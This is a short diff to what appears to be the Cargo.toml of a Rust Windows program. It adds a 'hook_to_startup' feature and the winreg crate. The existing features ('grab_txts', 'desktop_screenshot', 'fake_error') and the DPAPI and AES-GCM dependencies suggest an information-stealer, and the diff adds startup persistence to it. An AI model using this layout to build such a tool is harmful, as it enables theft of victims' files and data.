@@ -10,6 +10,7 @@ grab_txts = []
 desktop_screenshot = []
 pump_file = []
 fake_error = []
+hook_to_startup = []
 
 [dependencies]
 aes-gcm = "0.10.3"
@@ -30,3 +31,4 @@ windows = { version = "0.62.2", features = ["Win32_Security_Cryptography", "Win3
 windows-dpapi = "0.2.0"
 winres = "0.1.12"
 win-msgbox = "0.2.2"
+winreg = "0.56"
